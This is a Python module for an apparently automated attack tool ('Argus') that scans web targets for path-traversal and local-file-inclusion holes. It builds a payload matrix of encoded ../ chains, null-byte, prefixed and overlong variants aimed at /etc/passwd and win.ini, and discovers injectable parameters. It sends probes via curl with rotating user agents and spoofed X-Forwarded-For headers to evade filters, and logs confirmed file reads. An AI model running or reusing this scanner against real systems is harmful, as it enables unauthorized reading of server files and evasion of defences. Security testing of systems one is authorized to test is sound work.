"""Dedicated path-traversal / LFI probe service.

Promotes path traversal from a single branch inside
`EvasionService.advanced_vuln_probe` (app/tools/evasion.py) to a first-class,
independently invokable `BaseToolService`-style tool. Its distinguishing value
over the evasion probe is a full *encoding matrix* applied across *multiple
injectable parameters* (hybrid discovery: crawler-derived from memory, then a
static candidate fallback), rather than one payload class hitting one fixed
`?item=` parameter.

Verification is content-based via `SENSITIVE_CONTENT_INDICATORS` (a real
`/etc/passwd` / `web.config` read), never HTTP status alone - a bare 200/500
proves nothing about *what* came back.
"""
import os
import random
import re
import time
from urllib.parse import parse_qs, urlparse

from app.tools.crawler import PARAM_FINDING_SEP, CrawlerService
from app.tools.payloads import fetch_intruder_payloads
from app.tools.utils import (
    SENSITIVE_CONTENT_INDICATORS,
    normalize_domain_for_memory,
    shell_quote as _shell_quote,
)

# Common LFI/traversal parameter names, used as the static fallback half of the
# hybrid discovery strategy when the crawler surfaced no real query parameters.
DEFAULT_CANDIDATE_PARAMS = (
    "item", "file", "page", "path", "lang", "doc", "template",
    "include", "view", "name", "download", "filename",
)

# Traversal target files with the content indicator each one proves. The probe
# scales the leading `../` depth (1..MAX_DEPTH) for the Unix target, since the
# vulnerable sink's location relative to the filesystem root is unknown.
_UNIX_TARGET = "etc/passwd"
_WIN_TARGET = "windows/win.ini"
# Depth 6 still covers every realistic sink location (the classic
# `../../../etc/passwd` is depth 3) while cutting the payload set - and thus
# runtime - by a quarter versus the old depth 8. Kept as a module constant so
# it can be tuned without touching the scan loop.
MAX_DEPTH = 6

# Base directories a start-of-path validator typically expects the requested
# file to sit under. A payload that opens with one of these satisfies the
# `path.startswith(base)` check, then escapes back out with a `../` chain that
# the same validator no longer inspects.
_WEB_ROOT_PREFIXES = (
    "/var/www/images/",
    "/var/www/html/",
    "/var/www/",
)

# Extension suffixes for the null-byte class. A validator that requires the
# filename to end in an image extension passes, while a C-based file API
# terminates the string at the NUL and opens the traversal target instead.
_NULL_BYTE_EXTENSIONS = ("%00.png", "%00.jpg")

# Probe order for the payload matrix, cheapest-and-likeliest first, so a
# truncated budget keeps the high-yield payloads. Each class defeats a
# specific, distinct server-side defence - this ordering is deliberately one
# class per known filter, cheapest first:
#
#   absolute  - no `../` at all (`/etc/passwd`). Beats a filter that strips or
#               rejects traversal sequences outright. Only 4 payloads, and the
#               single cheapest thing worth trying, so it leads.
#   raw       - the plain `../` chain. What works on an unfiltered sink.
#   collapse  - `....//` collapses to `../` after ONE non-recursive strip pass.
#   single    - `..%2f`, for a filter that inspects the pre-decode string.
#   double    - `..%252f`, for a sink that URL-decodes a second, superfluous time.
#   nullbyte  - `%00.png` suffix, for a filter validating the file extension.
#   prefixed  - `/var/www/images/../../` for a filter validating the start of
#               the path. Largest class, so it sits behind the cheaper ones.
#   overlong  - `..%c0%af`, UTF-8 overlong encoding of `/`.
#   backslash - `..%5c`, for Windows/IIS path handling.
_ENCODING_CLASS_ORDER = (
    "absolute", "raw", "collapse", "single", "double",
    "nullbyte", "prefixed", "overlong", "backslash",
)

# The root-page fetch is the single point of failure for *all* tier-0 endpoint
# discovery: one transient stall there and `/image?filename=` is never found,
# leaving the scan to blind-guess and report a confident but worthless clean
# result. Retry it rather than treating one bad response as "no endpoints".
_PAGE_FETCH_ATTEMPTS = 3
_PAGE_FETCH_RETRY_DELAY = 2

# Encoding transforms applied to each traversal string, covering the standard
# WAF/normalization bypass classes: raw, single URL-encoding, double
# URL-encoding, UTF-8 overlong, mixed backslash, and the self-referential
# `....//` collapse trick.
_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
)


class PathTraversalScanner:
    """Dedicated multi-parameter, multi-encoding path-traversal probe."""

    def __init__(self, runner, memory):
        """Store the shared command runner and memory service.

        Args:
            runner: Object with a `run(command, timeout=...)` method that
                executes a shell command (via WSL/SSH) and returns stdout as
                a str.
            memory (ArgusMemory): Blackboard memory service used to read
                crawler-discovered links and persist confirmed findings.
        """
        self.runner, self.memory = runner, memory

    # ------------------------------------------------------------------
    # Payload / parameter construction
    # ------------------------------------------------------------------
    @staticmethod
    def _encode_variants(traversal: str, target: str) -> dict[str, str]:
        """Return the encoding matrix for one `../`-prefixed traversal string.

        Args:
            traversal (str): The `../` (or `..\\`) prefix chain, e.g.
                ``"../../../"``.
            target (str): The sensitive file path without leading slash, e.g.
                ``"etc/passwd"``.

        Returns:
            dict[str, str]: Encoding-class name -> payload, deduplicated by
            payload value (a `..\\` prefix makes the `overlong` and `collapse`
            transforms no-ops that collide with `raw`, so a Windows chain
            yields 4 entries where a Unix chain yields 6). Keying by class
            rather than returning a bare list lets `_build_payloads` order the
            set by encoding class, which is what makes a truncated budget
            degrade sensibly.
        """
        raw = f"{traversal}{target}"
        variants = {
            "raw": raw,
            "single": raw.replace("../", "..%2f").replace("/", "%2f"),
            "double": raw.replace("../", "..%252f").replace("/", "%252f"),
            "overlong": raw.replace("../", "..%c0%af"),
            "backslash": raw.replace("/", "\\").replace("..\\", "..%5c"),
            # `....//` collapses to `../` after one naive normalization pass.
            "collapse": raw.replace("../", "....//"),
        }
        seen: set[str] = set()
        return {
            cls: v for cls, v in variants.items()
            if not (v in seen or seen.add(v))
        }

    def _build_payloads(self) -> list[str]:
        """Assemble the full payload set: the depth-scaled encoding matrix for
        the Unix and Windows targets, the three filter-bypass classes that
        need no `../` prefix scaling, plus a real sample from the local
        PayloadsAllTheThings mirror (deduplicated).

        Ordered by *encoding class* (all absolute, then all raw across both OS
        families and every depth, and so on) rather than depth-major. This
        matters because low-priority injection points get a truncated budget:
        a depth-major order spent that entire budget on depth-1's ten exotic
        encodings, whereas class-major order spends it on the payloads that
        each defeat a distinct real filter.

        The `absolute`, `prefixed` and `nullbyte` classes exist because the
        depth loop starts at 1, so *every* payload it can emit begins with at
        least one `../`. Live failure (2026-07-27): a PortSwigger lab whose
        `filename` parameter was correctly discovered and swept with all 68
        payloads of the time returned no finding, because its filter rejected
        traversal sequences outright and the only working value - a bare
        `/etc/passwd` - was a string the generator structurally could not
        produce at any MAX_DEPTH setting. Widening the depth range cannot fix
        that; these classes can.

        Returns:
            list[str]: Ordered, deduplicated payload strings.
        """
        by_class: dict[str, list[str]] = {}

        def add(cls: str, payload: str) -> None:
            """Record one payload under its encoding class.

            Args:
                cls (str): Encoding-class name from `_ENCODING_CLASS_ORDER`.
                payload (str): The payload string.

            Returns:
                None
            """
            by_class.setdefault(cls, []).append(payload)

        # Depth 0 - no traversal sequence at all. Defeats a filter that strips
        # or rejects `../`, since there is nothing for it to strip.
        for target in (_UNIX_TARGET, _WIN_TARGET):
            absolute = f"/{target}"
            add("absolute", absolute)
            add("absolute", absolute.replace("/", "%2f"))

        for depth in range(1, MAX_DEPTH + 1):
            unix_chain = "../" * depth
            for variants in (
                self._encode_variants(unix_chain, _UNIX_TARGET),
                self._encode_variants("..\\" * depth, _WIN_TARGET),
            ):
                for cls, payload in variants.items():
                    add(cls, payload)

            # Satisfies a start-of-path check, then escapes back out.
            for prefix in _WEB_ROOT_PREFIXES:
                add("prefixed", f"{prefix}{unix_chain}{_UNIX_TARGET}")

            # Passes a file-extension check; the NUL truncates the real read.
            for extension in _NULL_BYTE_EXTENSIONS:
                add("nullbyte", f"{unix_chain}{_UNIX_TARGET}{extension}")

        payloads: list[str] = []
        for cls in _ENCODING_CLASS_ORDER:
            payloads.extend(by_class.get(cls, []))

        # Enrich with real strings from the local mirror (never regresses:
        # returns [] when the mirror is absent - see fetch_intruder_payloads).
        payloads.extend(fetch_intruder_payloads(self.runner, "path_traversal", limit=8))

        seen: set[str] = set()
        return [p for p in payloads if not (p in seen or seen.add(p))]

    def _extract_page_endpoints(self, root: str, target_netloc: str) -> list[tuple[str, str]]:
        """Fetch the target's root page and mine same-host, parameter-bearing
        endpoints out of its `href`/`src` attributes.

        This is what lets the scanner reach a vulnerable endpoint like
        `/image?filename=` that lives in an `<img src>` (never a query param on
        the site root). Only endpoints whose host matches `target_netloc` are
        returned - external links (CDNs, social buttons, the vendor's own
        marketing site) are never probed.

        Args:
            root (str): Target root URL (scheme + host[:port]).
            target_netloc (str): Host[:port] that a discovered endpoint must
                match to be in-scope.

        Returns:
            list[tuple[str, str]]: `(request_url, param)` pairs, request_url
            rebuilt on the target's own scheme/host so an absolute same-host
            link can't redirect the probe elsewhere.
        """
        root_arg = _shell_quote(f"{root}/")
        cmd = f"curl -s --http1.1 --max-time 15 --connect-timeout 5 {root_arg}"
        html = ""
        for attempt in range(_PAGE_FETCH_ATTEMPTS):
            try:
                html = self.runner.run(cmd, timeout=20)
            except Exception:
                html = ""
            if html:
                break
            if attempt < _PAGE_FETCH_ATTEMPTS - 1:
                print(f"[*] [Argus-Core] Root page returned nothing; retrying endpoint "
                      f"discovery {attempt + 1}/{_PAGE_FETCH_ATTEMPTS - 1}...")
                time.sleep(_PAGE_FETCH_RETRY_DELAY)
        if not html:
            return []

        # Single source of truth for HTML parsing: reuse CrawlerService's
        # harvester rather than maintaining a second, weaker regex here. That
        # one already covers href/src/action/data-src, single-quoted markup,
        # <form> field names and <script> bodies - this used to see only
        # double-quoted href/src and silently missed the rest.
        target_host = target_netloc.split(":")[0]
        harvester = CrawlerService(self.runner, self.memory)
        endpoints: list[tuple[str, str]] = []
        for link, _source in harvester._harvest(html, f"{root}/", target_host):
            parsed = urlparse(link)
            if not parsed.query:
                continue
            request_url = f"{root}{parsed.path or '/'}"
            for name in parse_qs(parsed.query, keep_blank_values=True):
                endpoints.append((request_url, name))
        return endpoints

    def _discover_injection_points(
        self, url: str, explicit_params
    ) -> list[tuple[str, str]]:
        """Backwards-compatible view of `_discover_injection_points_tiered()`
        that drops the discovery tier.

        Args:
            url (str): Target URL.
            explicit_params (list[str] | None): Caller-supplied parameter
                names; when provided, discovery is skipped.

        Returns:
            list[tuple[str, str]]: Ordered, deduplicated `(request_url, param)`
            pairs.
        """
        return [(u, p) for u, p, _ in self._discover_injection_points_tiered(url, explicit_params)]

    def _discover_injection_points_tiered(
        self, url: str, explicit_params, attack_surface: dict | None = None
    ) -> list[tuple[str, str, int]]:
        """Resolve the full set of `(request_url, param)` injection points.

        Strategy (deduplicated, highest-signal first):
          1. If `explicit_params` is given, test exactly those on `url` - no
             discovery (deterministic; used by the manual/CLI path).
          2. Otherwise: params already on `url`, then live endpoints mined
             from the root page (`_extract_page_endpoints`), then the
             `(endpoint, param)` pairs `CrawlerService` persisted in memory
             (`data_type="param"`, plus legacy `data_type="link"`), then a
             static parameter fallback on the base path so the probe always
             has an attack surface.

        Args:
            url (str): Target URL. May carry a path (e.g. `/image`) and/or a
                query string; both are honored.
            explicit_params (list[str] | None): Caller-supplied parameter
                names. When provided, discovery is skipped entirely.

        Returns:
            list[tuple[str, str, int]]: Ordered, deduplicated
            `(request_url, param, tier)` triples, where tier 0 is a real
            observed parameter and tier 1 a blind static guess. The caller
            uses the tier to size each point's probe budget.
        """
        parsed = urlparse(url if url.startswith("http") else f"http://{url}")
        root = f"{parsed.scheme}://{parsed.netloc}"
        base_no_query = f"{root}{parsed.path}" if parsed.path else root

        seen: set[tuple[str, str]] = set()

        # Each entry carries a source tier so real, observed params (on the
        # URL / page / crawler) are always probed before the static guesses.
        tiered: list[tuple[int, str, str]] = []  # (tier, request_url, param)

        def add(request_url: str, param: str, tier: int) -> None:
            """Record one candidate injection point if not already seen.

            Args:
                request_url (str): The URL to probe `param` on.
                param (str): Query parameter name to inject into.
                tier (int): Discovery-source priority (0 = observed, 1 =
                    static fallback guess); lower sorts first.

            Returns:
                None
            """
            key = (request_url, param)
            if param and key not in seen:
                seen.add(key)
                tiered.append((tier, request_url, param))

        if explicit_params:
            for name in explicit_params:
                add(base_no_query, name, 0)
            return [(u, p, t) for t, u, p in tiered]

        # Tier 0 - real, observed injection points:
        #   0. A CrawlerService attack surface handed straight in by the caller
        #      (the integrated pipeline's primary path). Already normalized -
        #      same-host filtered, duplicate sinks collapsed, ranked - so it is
        #      consumed verbatim and takes priority over anything rediscovered.
        if attack_surface:
            for request_url, name in attack_surface.get("injection_points", []):
                add(request_url, name, 0)
        #   1. Params already present on the supplied URL.
        for name in parse_qs(parsed.query):
            add(base_no_query, name, 0)
        #   2. Live endpoints discovered on the root page (finds /image?filename=).
        #      Skipped when a surface was supplied: that same page was already
        #      parsed by the crawler, so re-fetching it is a wasted request.
        if not attack_surface:
            for request_url, name in self._extract_page_endpoints(root, parsed.netloc):
                add(request_url, name, 0)
        #   3. Injection points the crawler resolved explicitly, and the
        #      crawler links it persisted.
        clean_target = normalize_domain_for_memory(url)
        try:
            findings = self.memory.get_detailed_findings(clean_target)
        except Exception:
            findings = []
        target_host = parsed.netloc.split(":")[0]
        for f in findings or []:
            data_type = f.get("data_type")
            raw = f.get("raw_data", "") or ""

            # `param` findings are the crawler's explicit handoff: it already
            # resolved the endpoint, filtered to same-host, collapsed duplicate
            # sinks and dropped the parameter *value* (which the payload
            # overwrites anyway), so no re-parsing guesswork is needed here.
            if data_type == "param":
                endpoint, _, name = raw.partition(PARAM_FINDING_SEP)
                if not name:
                    continue
                eparsed = urlparse(endpoint if endpoint.startswith("http")
                                   else f"{root}{endpoint}")
                if eparsed.netloc and eparsed.netloc.split(":")[0] != target_host:
                    continue
                add(f"{root}{eparsed.path}" if eparsed.path else base_no_query,
                    name, 0)
                continue

            # Legacy `link` findings: any other producer (or an older crawl
            # still in the blackboard) still contributes its query parameters.
            if data_type != "link":
                continue
            link = raw
            lparsed = urlparse(link if link.startswith("http") else f"{root}{link}")
            if lparsed.netloc and lparsed.netloc.split(":")[0] != target_host:
                continue
            link_url = f"{root}{lparsed.path}" if lparsed.path else base_no_query
            # Match against the query component only, so a path containing an
            # `=` can never be mistaken for a parameter name.
            for match in re.finditer(r"[?&]([A-Za-z0-9_\-\[\]]+)=", f"?{lparsed.query}"):
                add(link_url, match.group(1), 0)

        # Tier 1 - static fallback guesses on the base path.
        for name in DEFAULT_CANDIDATE_PARAMS:
            add(base_no_query, name, 1)

        # Order: observed params before static guesses (tier), and within each
        # tier, file-ish parameter names first so a real traversal sink (e.g.
        # `filename` on /image) is probed before the max_probes budget runs
        # out. Stable sort preserves discovery order otherwise.
        high_signal = {
            "filename", "file", "path", "page", "doc", "document",
            "include", "download", "template", "view", "name",
        }
        tiered.sort(key=lambda t: (t[0], 0 if t[2].lower() in high_signal else 1))
        return [(u, p, t) for t, u, p in tiered]

    # ------------------------------------------------------------------
    # Execution
    # ------------------------------------------------------------------
    def _stealth_curl(self, url: str, param: str, payload: str, timeout: int = 12) -> str:
        """Issue one stealth-headed curl probe for a single param/payload pair.

        Args:
            url (str): Base target URL (scheme + host[:port]).
            param (str): Injectable query parameter name.
            payload (str): Traversal payload string.
            timeout (int): Per-call bound; probes run sequentially so a
                generous per-call timeout can otherwise exhaust the
                exploit-node budget (mirrors EvasionService.stealth_run).

        Returns:
            str: Response body (stdout from curl), or "" on failure.
        """
        # Small jitter only. The previous 0.5-1.5s/probe delay stacked to ~60s
        # across a full scan with no real evasion benefit against a normal
        # target; set ARGUS_PT_STEALTH=1 to restore a larger WAF-evasion delay.
        if os.getenv("ARGUS_PT_STEALTH") == "1":
            time.sleep(random.uniform(0.5, 1.5))
        else:
            time.sleep(random.uniform(0.05, 0.2))
        return self._stealth_curl_raw(f"{url}?{param}={payload}", timeout=timeout,
                                      delay=False)

    def _stealth_curl_raw(self, full_url: str, timeout: int = 12,
                          delay: bool = True) -> str:
        """Issue one stealth-headed curl probe against a fully-formed URL.

        Split out of `_stealth_curl` so path-segment injection - where the
        payload is appended to the path, not to a `?param=` - reuses the exact
        same headers, jitter and timeout policy instead of duplicating them.

        Args:
            full_url (str): The complete URL to request, payload included.
            timeout (int): Per-call bound; probes run sequentially so a
                generous per-call timeout can otherwise exhaust the
                exploit-node budget (mirrors EvasionService.stealth_run).
            delay (bool): Apply the stealth jitter. False when the caller has
                already slept for this probe.

        Returns:
            str: Response body (stdout from curl), or "" on failure.
        """
        if delay:
            if os.getenv("ARGUS_PT_STEALTH") == "1":
                time.sleep(random.uniform(0.5, 1.5))
            else:
                time.sleep(random.uniform(0.05, 0.2))
        ua = random.choice(_USER_AGENTS)
        xff = ".".join(str(random.randint(1, 255)) for _ in range(4))
        # Shell-safety: the URL is attacker-influenced (crawler-mined from the
        # target's own pages - see _shell_quote's docstring) and the payload is
        # metacharacter-dense by construction. Quote every interpolation.
        ua_header = _shell_quote(f"User-Agent: {ua}")
        xff_header = _shell_quote(f"X-Forwarded-For: {xff}")
        target = _shell_quote(full_url)
        # --http1.1: PortSwigger (and many targets) negotiate HTTP/2 via ALPN,
        # and HTTP/2 over WSL2's NAT intermittently returns curl code 000
        # (handshake ok, data frames drop). Forcing 1.1 makes probes reliable.
        #
        # --path-as-is: curl resolves `/../` and `/./` in the PATH component
        # client-side before sending. Verified locally against a deliberately
        # vulnerable `/download/<file>` sink: without this flag curl rewrote
        # `/download/../../../etc/passwd` to `/etc/passwd` and the probe tested
        # the wrong URL entirely. Harmless for query-string payloads, where the
        # path is already clean, so it is applied unconditionally to guarantee
        # every payload reaches the server byte-exact.
        cmd = (
            f"curl -s --http1.1 --path-as-is --max-time {timeout} "
            f"--connect-timeout 5 "
            f"-H {ua_header} -H {xff_header} "
            f"{target}"
        )
        return self.runner.run(cmd, timeout=timeout + 5)

    def _wait_until_awake(self, root: str, attempts: int = 4, delay: int = 5) -> bool:
        """Probe the target root until it serves a real response, waking a
        sleeping backend (e.g. an idle PortSwigger lab, which returns 504 /
        curl-000 until the first request wakes it, then needs a few seconds).

        Args:
            root (str): Target root URL (scheme + host[:port]).
            attempts (int): Max wake probes before giving up.
            delay (int): Seconds to wait between attempts.

        Returns:
            bool: True once an HTTP 2xx/3xx/4xx (i.e. the app is actually
            responding, even a 404) is seen; False if it only ever returns
            504/502/000/empty across all attempts (backend down/unreachable).
        """
        root_arg = _shell_quote(f"{root}/")
        for i in range(attempts):
            res = self.runner.run(
                f"curl -s -o /dev/null --http1.1 -w '%{{http_code}}' "
                f"--max-time 15 --connect-timeout 5 {root_arg}",
                timeout=20,
            )
            code = (res or "").strip()[-3:]
            if code.isdigit() and code not in ("000", "502", "503", "504"):
                return True
            if i < attempts - 1:
                print(f"[*] [Argus-Core] Target not responding (code={code or 'none'}); "
                      f"waking, retry {i + 1}/{attempts - 1} in {delay}s...")
                time.sleep(delay)
        return False

    def scan_attack_surface(self, surface: dict, **kwargs) -> str:
        """Scan a `CrawlerService.harvest_attack_surface()` result end to end.

        The integrated pipeline's join point: the crawler's normalized output
        goes in, a findings report comes out, with no rediscovery in between.

        Args:
            surface (dict): Output of `CrawlerService.harvest_attack_surface()`.
            **kwargs: Forwarded to `run_traversal_scan()` (probe budgets).

        Returns:
            str: The path-traversal scan report.
        """
        return self.run_traversal_scan(
            surface.get("target", ""), attack_surface=surface, **kwargs
        )

    def _probe_path_segments(self, segments, payloads, clean_target,
                             budget, results, confirmed) -> int:
        """Append traversal payloads to a path, rather than to a parameter.

        Covers sinks that read the trailing path segment itself
        (`/download/<file>` style routing) instead of a query parameter, which
        parameter-only injection structurally cannot reach.

        Args:
            segments (list[str]): Parameterless endpoint URLs to probe.
            payloads (list[str]): The shared payload matrix.
            clean_target (str): Memory key for `add_finding`.
            budget (int): Max probes per segment.
            results (list[str]): Report lines, appended to in place.
            confirmed (set): Dedup key set shared with the parameter sweep.

        Returns:
            int: Number of probes actually sent.
        """
        sent = 0
        for endpoint in segments:
            base = endpoint.rstrip("/")
            for payload in payloads[:budget]:
                sent += 1
                url = f"{base}/{payload}"
                body = self._stealth_curl_raw(url)
                if not body:
                    continue
                hit = False
                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
                    key = (base, "<path>", indicator)
                    if indicator in body and key not in confirmed:
                        confirmed.add(key)
                        results.append(
                            f"[!] Path Traversal Success (endpoint={base}, "
                            f"param=<path segment>, payload={payload}): "
                            f"{summary} [signature: {indicator}]"
                        )
                        self.memory.add_finding(
                            clean_target, "path_traversal", "vulnerability",
                            f"Traversal: {url}", summary,
                        )
                        hit = True
                        break
                if hit:
                    break
        return sent

    def run_traversal_scan(self, url, params=None, max_probes=None,
                           max_guess_probes=16, max_total_probes=720,
                           attack_surface=None, path_segment_probes=10):
        """Run a hybrid, multi-encoding path-traversal scan against `url`.

        Args:
            url (str): Target URL (scheme + host[:port]). Query params on the
                URL itself are treated as high-priority injection points.
            params (list[str] | None): Explicit parameter names to test. When
                None, full injection-point discovery runs (URL params, live
                page endpoints such as `/image?filename=`, crawler links, and
                a static parameter fallback).
            attack_surface (dict | None): A
                `CrawlerService.harvest_attack_surface()` result. When given,
                its `injection_points` are consumed directly as tier-0 points
                and its `path_segments` are probed too; the scanner then skips
                its own root-page re-fetch, since the crawler already parsed
                that page. This is the integrated pipeline's data path.
            path_segment_probes (int): Per-endpoint probe budget for
                path-segment injection (`/download/../../../etc/passwd`). Set
                to 0 to disable.
            max_probes (int | None): Probe budget for each *observed* (tier-0)
                injection point - a param already on the URL, mined from a live
                page endpoint, or seen by the crawler. `None` (default) means
                the entire payload list, so anything real gets the complete
                depth x encoding sweep.

                Do not hardcode this to a literal: `_build_payloads()` emits 94
                built-in payloads (4 absolute + 10/depth x MAX_DEPTH=6 encoding
                variants, being 6 Unix-style + 4 deduplicated Windows-style
                each, + 3 prefixed and 2 nullbyte per depth) and then *appends*
                up to 8 sampled from the PayloadsAllTheThings mirror. A literal
                ceiling silently truncated exactly those mirror entries - they
                sit past the generated set - so the enrichment never fired on
                any host that had the mirror installed.

                This was previously a *global* ceiling of 120, which silently
                capped a scan at the first two injection points: a bare host
                discovers 12 static candidates, so a genuinely vulnerable
                `filename` (9th in probe order) or `lang` (12th) was never
                probed at all and the scan returned a false "no vulnerability"
                verdict. Budgeting per point removes that starvation.
            max_guess_probes (int): Probe budget for each tier-1 *blind static
                guess* from DEFAULT_CANDIDATE_PARAMS. Default 16 = the whole
                `absolute` class (4) plus the plain `../` chains for both OS
                families across all six depths (12); payloads are ordered
                encoding-class-major, so a truncated budget keeps the
                high-yield ones. Raised from 12 when the `absolute` class was
                added: at 12 a blind guess no longer reached depths 5-6 of the
                raw chain. Giving blind guesses the full 94-payload matrix cost
                ~6x the scan time for almost no yield - on a bare host, eleven
                of the twelve guesses are parameters the application never
                reads. Raise this when a target is known to sit behind a filter
                that demands an encoded payload on an unadvertised parameter.
            max_total_probes (int): Global safety ceiling across all injection
                points, protecting the exploit-node time budget when discovery
                surfaces an unexpectedly large parameter set.

        Returns:
            str: A structured report. Each confirmed read is a "[!] Path
            Traversal Success" line; a clean scan returns an explicit
            no-findings message.
        """
        print(f"[*] [Argus-Core] Starting dedicated Path Traversal scan for: {url}")
        clean_target = normalize_domain_for_memory(url)

        # Wake a sleeping/unreachable target before scanning. If it never
        # responds, report that truthfully - a dead target is NOT the same as
        # "no vulnerability found", and endpoint discovery would otherwise get
        # an empty page and silently fall back to blind static probing.
        parsed_root = urlparse(url if url.startswith("http") else f"http://{url}")
        root = f"{parsed_root.scheme}://{parsed_root.netloc}"
        if not self._wait_until_awake(root):
            return (
                "--- [TOOLS] PATH TRAVERSAL SCAN REPORT ---\n"
                f"Target: {url}\n"
                "TARGET UNREACHABLE - the server returned only gateway-timeout / "
                "no-response (504/000) across multiple wake attempts. The backend "
                "is down or asleep (common for idle PortSwigger labs). This is NOT "
                "a 'no vulnerability' result - reload the target in a browser to "
                "wake it, then re-run."
            )

        injection_points = self._discover_injection_points_tiered(
            url, params, attack_surface
        )
        payloads = self._build_payloads()

        results: list[str] = []
        confirmed: set[tuple[str, str, str]] = set()
        probe_count = 0
        empty_responses = 0
        # None = "the whole payload list", which keeps the mirror-sampled
        # entries appended past index 60 actually reachable.
        full_budget = len(payloads) if max_probes is None else max_probes

        for request_url, param, tier in injection_points:
            if probe_count >= max_total_probes:
                break
            # Per-point budget: every discovered parameter gets its own sweep,
            # so a vulnerable param late in the probe order can no longer be
            # starved out by earlier ones exhausting a shared pool. Observed
            # params earn the full matrix; blind static guesses get the
            # high-yield prefix of it.
            point_budget = full_budget if tier == 0 else max_guess_probes
            point_probes = 0
            point_confirmed = False
            for payload in payloads:
                if point_probes >= point_budget or probe_count >= max_total_probes:
                    break
                point_probes += 1
                probe_count += 1
                body = self._stealth_curl(request_url, param, payload)
                if not body and tier == 0 and probe_count < max_total_probes:
                    # An empty reply is indistinguishable from "not vulnerable"
                    # but usually means the probe timed out. On a *real*
                    # observed parameter that silence is expensive - it could be
                    # the one payload that would have confirmed - so spend one
                    # retry. Guesses aren't worth the budget.
                    point_probes += 1
                    probe_count += 1
                    body = self._stealth_curl(request_url, param, payload)
                if not body:
                    empty_responses += 1
                    continue
                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
                    key = (request_url, param, indicator)
                    if indicator in body and key not in confirmed:
                        confirmed.add(key)
                        # Embed the raw matched signature token in the report
                        # line so the shared reflective verifier
                        # (post_execute_verify, which keys on
                        # SENSITIVE_CONTENT_INDICATORS substrings) independently
                        # re-confirms this as a SUCCESS and exploit_node can
                        # set exploit_success=True.
                        results.append(
                            f"[!] Path Traversal Success (endpoint={request_url}, "
                            f"param={param}, payload={payload}): "
                            f"{summary} [signature: {indicator}]"
                        )
                        self.memory.add_finding(
                            clean_target, "path_traversal", "vulnerability",
                            f"Traversal: {request_url}?{param}={payload}", summary,
                        )
                        point_confirmed = True
                        break
                if point_confirmed:
                    # This parameter is proven vulnerable - the remaining
                    # encodings would only re-prove the same sink. Move to the
                    # next injection point instead of burning the rest of this
                    # point's budget (a confirmed target otherwise costs a full
                    # 60-payload sweep per vulnerable param for no new signal).
                    break

        # Path-segment injection: for sinks that read the trailing path segment
        # (`/download/<file>` routing) rather than a query parameter. Only the
        # crawler knows which endpoints are parameterless, so this runs solely
        # on a supplied attack surface.
        segment_probes = 0
        if attack_surface and path_segment_probes and probe_count < max_total_probes:
            segments = attack_surface.get("path_segments", [])
            segment_probes = self._probe_path_segments(
                segments, payloads, clean_target,
                min(path_segment_probes, max_total_probes - probe_count),
                results, confirmed,
            )
            probe_count += segment_probes

        header = "--- [TOOLS] PATH TRAVERSAL SCAN REPORT ---"
        observed = sum(1 for _, _, t in injection_points if t == 0)
        guessed = len(injection_points) - observed
        meta = (
            f"Target: {url} | injection points: {len(injection_points)} "
            f"(observed: {observed}, guessed: {guessed}) | "
            f"payloads: {len(payloads)} | probes sent: {probe_count}"
        )
        if attack_surface:
            meta += (
                f" | source: crawler attack surface "
                f"({len(attack_surface.get('endpoints', []))} endpoints, "
                f"{len(attack_surface.get('path_segments', []))} path segments)"
            )
        if empty_responses:
            meta += f" | empty responses: {empty_responses}"
        if results:
            return f"{header}\n{meta}\n" + "\n".join(results)

        # A clean result is only as trustworthy as the attack surface it
        # covered. Two runs against the same host can legitimately disagree
        # when endpoint discovery succeeds once and stalls the next time, and
        # without this the report looked identically confident either way.
        caveats = []
        if observed == 0:
            caveats.append(
                "LOW CONFIDENCE - no real parameters were observed on this target "
                "(the root page exposed none, and the crawler had no links in "
                "memory), so only blind guesses from DEFAULT_CANDIDATE_PARAMS "
                "were probed. A vulnerable endpoint on a path this scan never "
                "saw (e.g. /image?filename=) would be missed. Run Crawl_Target "
                "first, or pass the endpoint and parameter explicitly."
            )
        if empty_responses:
            caveats.append(
                f"{empty_responses} probe(s) returned an empty body (timeout or "
                "dropped connection) and could not be evaluated - this result is "
                "not a clean bill of health for those payloads."
            )
        body = "No path-traversal vulnerabilities confirmed."
        if caveats:
            body += "\n" + "\n".join(f"  [!] {c}" for c in caveats)
        return f"{header}\n{meta}\n{body}"
